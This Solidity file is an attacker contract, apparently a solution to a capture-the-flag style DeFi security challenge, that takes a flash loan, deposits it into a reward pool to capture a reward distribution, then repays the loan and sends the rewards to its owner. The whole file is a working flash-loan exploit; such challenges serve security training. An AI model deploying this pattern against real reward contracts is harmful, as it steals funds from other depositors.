// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IFlashLoanerPool {
    function flashLoan(uint256 amount) external;
}

interface ITheRewarderPool {
    function deposit(uint256 amountToDeposit) external;
    function withdraw(uint256 amountToWithdraw) external;
    function distributeRewards() external returns (uint256);
}

contract RewarderAttacker {
    address owner;

    IERC20 damnValuableToken;
    IERC20 rewardToken;

    IFlashLoanerPool loanerPool;
    ITheRewarderPool rewarderPool;

    constructor(address _damnValuableToken, address _rewardToken, address _loanerPool, address _rewarder){
        owner = msg.sender;

        damnValuableToken = IERC20(_damnValuableToken);
        rewardToken = IERC20(_rewardToken);

        loanerPool = IFlashLoanerPool(_loanerPool);
        rewarderPool = ITheRewarderPool(_rewarder);
    }

    function flashLoan() external {
        loanerPool.flashLoan(damnValuableToken.balanceOf(address(loanerPool)));
    }
    
    function receiveFlashLoan(uint256 amount) external {
        damnValuableToken.approve(address(rewarderPool), amount);
        
        rewarderPool.deposit(amount);
        rewarderPool.distributeRewards();
        rewarderPool.withdraw(amount);

        damnValuableToken.transfer(address(loanerPool), amount);
        rewardToken.transfer(owner, rewardToken.balanceOf(address(this)));
    }
}